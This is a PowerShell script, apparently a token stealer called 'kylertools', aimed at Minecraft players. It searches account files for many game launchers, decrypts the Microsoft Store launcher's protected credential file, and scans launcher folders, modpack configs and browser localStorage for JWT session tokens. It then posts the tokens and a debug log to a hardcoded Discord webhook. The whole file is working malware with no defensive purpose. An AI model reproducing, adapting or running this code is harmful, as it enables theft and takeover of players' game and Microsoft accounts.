$webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit"
$h = @{ "Content-Type" = "application/json" }

Add-Type -AssemblyName System.Security -EA 0

# debug log so u can see whats happening
$debug = @()
$debug += "start: $(Get-Date -Format o)"
$debug += "user: $env:USERNAME"

# test ping
try{
    $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json
    iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 10 -EA 0 | Out-Null
    $debug += "ping: ok"
}catch{
    $debug += "ping: fail - $($_.Exception.Message)"
}

$found = @()
$seen = @{}

# strict regex - only real jwt tokens
$jwtRegex = "eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}"

function Add-Token {
    param($tok, $user, $src)
    if(-not $tok){ return }
    if($tok.Length -lt 100){ return }
    if($tok -notmatch "^eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+$"){ return }
    if($seen.ContainsKey($tok)){ return }
    $seen[$tok] = $true
    $script:found += "user: $user`nssid: $tok`nfile: $src`n"
}

# 1. known launcher account files
$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\TlauncherProfiles.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\accounts.json",
    "$env:APPDATA\.technic\oauth\accounts.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\PrismLauncher\accounts.json",
    "$env:APPDATA\MultiMC\accounts.json",
    "$env:APPDATA\PollyMC\accounts.json",
    "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
    "$env:APPDATA\ModrinthApp\launcher_accounts.json",
    "$env:APPDATA\ModrinthApp\launcher_profiles.json",
    "$env:APPDATA\xmcl\user.json",
    "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
    "$env:APPDATA\.salwyrr\accounts.json",
    "$env:APPDATA\.sklauncher\accounts.json",
    "$env:APPDATA\Badlion Client\accounts.json"
)

foreach($p in $paths){
    if(Test-Path $p){
        $debug += "found file: $p"
        try{
            $raw = Get-Content $p -Raw
            $j = $raw | ConvertFrom-Json -EA 0
            if($j.accounts){
                $j.accounts.PSObject.Properties | %{
                    $a = $_.Value
                    $uname = "unknown"
                    if($a.minecraftProfile -and $a.minecraftProfile.name){ $uname = $a.minecraftProfile.name }
                    elseif($a.username){ $uname = $a.username }
                    if($a.accessToken){ Add-Token $a.accessToken $uname $p }
                }
            }
            [regex]::Matches($raw, $jwtRegex) | %{ Add-Token $_.Value "unknown" $p }
        }catch{
            $debug += "read fail on $p : $($_.Exception.Message)"
        }
    }
}

# 2. decrypt MSA credential bin
$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    $debug += "found bin: $bin"
    try{
        $bytes = [IO.File]::ReadAllBytes($bin)
        $dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, "CurrentUser")
        $txt = [Text.Encoding]::UTF8.GetString($dec)
        [regex]::Matches($txt, $jwtRegex) | %{ Add-Token $_.Value "unknown" $bin }
    }catch{
        $debug += "bin decrypt fail: $($_.Exception.Message)"
    }
}

# 3. deep scan launcher folders
$roots = @(
    "$env:APPDATA\.minecraft",
    "$env:APPDATA\.lunarclient",
    "$env:APPDATA\ModrinthApp",
    "$env:APPDATA\PrismLauncher",
    "$env:APPDATA\MultiMC",
    "$env:APPDATA\xmcl",
    "$env:APPDATA\.technic",
    "$env:APPDATA\.feather"
)

foreach($r in $roots){
    if(Test-Path $r){
        try{
            Get-ChildItem $r -Recurse -File -Include "accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","*.auth.json" -EA 0 | %{
                if($_.FullName -match "webcache|node_modules|\.git\\"){ return }
                if($_.Length -gt 1mb){ return }
                $c = Get-Content $_.FullName -Raw -EA 0
                [regex]::Matches($c, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
            }
        }catch{}
    }
}

# 4. modpack profile configs (opsec + alt account mods)
$profileRoots = @(
    "$env:APPDATA\ModrinthApp\profiles",
    "$env:APPDATA\PrismLauncher\instances",
    "$env:APPDATA\MultiMC\instances",
    "$env:APPDATA\.minecraft\config",
    "$env:APPDATA\.minecraft\versions"
)

foreach($pr in $profileRoots){
    if(Test-Path $pr){
        $debug += "profile root ok: $pr"
        try{
            Get-ChildItem $pr -Recurse -File -Include "opsec-accounts.json","accounts.json","*.auth.json" -EA 0 | %{
                $debug += "  file: $($_.FullName)"
                if($_.Length -gt 1mb){ return }
                $c = Get-Content $_.FullName -Raw -EA 0
                try{
                    $pj = $c | ConvertFrom-Json -EA 0
                    if($pj.accounts){
                        $pj.accounts | %{
                            $u = if($_.username){ $_.username } else { "unknown" }
                            if($_.accessToken){ Add-Token $_.accessToken $u $_.FullName }
                        }
                    }
                }catch{}
                [regex]::Matches($c, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
            }
        }catch{}
    } else {
        $debug += "profile root MISSING: $pr"
    }
}

# 5. chromium localstorage
$webcaches = @(
    "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
    "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
    "$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb"
)

foreach($lc in $webcaches){
    if(Test-Path $lc){
        $debug += "webcache ok: $lc"
        try{
            Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | %{
                if($_.Length -gt 5mb){ return }
                $b = [IO.File]::ReadAllBytes($_.FullName)
                $s = [Text.Encoding]::UTF8.GetString($b)
                [regex]::Matches($s, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
            }
        }catch{}
    }
}

$debug += "tokens found: $($found.Count)"
$debug += "end: $(Get-Date -Format o)"

# send debug log
$dbgTxt = $debug -join "`n"
$dbgLimit = 1800
$dbgChunks = @()
for($i = 0; $i -lt $dbgTxt.Length; $i += $dbgLimit){
    $dbgChunks += $dbgTxt.Substring($i, [Math]::Min($dbgLimit, $dbgTxt.Length - $i))
}
foreach($c in $dbgChunks){
    $dbgEmbed = @{
        title = "debug"
        description = "``````$c``````"
        color = 3447003
        timestamp = (Get-Date).ToString("o")
    }
    $dbgBody = @{ embeds = @($dbgEmbed) } | ConvertTo-Json -Depth 10
    try{ iwr -Uri $webhook -Method Post -Headers $h -Body $dbgBody -TimeoutSec 10 -EA 0 | Out-Null }catch{}
    Start-Sleep -Milliseconds 900
}

# send tokens
if($found.Count -eq 0){
    $found = "nothin found bro"
}

$joined = $found -join "`n"

$limit = 1800
$chunks = @()
for($i = 0; $i -lt $joined.Length; $i += $limit){
    $chunks += $joined.Substring($i, [Math]::Min($limit, $joined.Length - $i))
}

$n = 0
foreach($c in $chunks){
    $n++
    $embed = @{
        title = "mc tokens"
        description = "``````$c``````"
        color = 5793266
        footer = @{ text = "kylertools | part $n/$($chunks.Count)" }
        timestamp = (Get-Date).ToString("o")
    }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
    try{
        iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 10 -EA 0 | Out-Null
    }catch{}
    Start-Sleep -Milliseconds 900
}
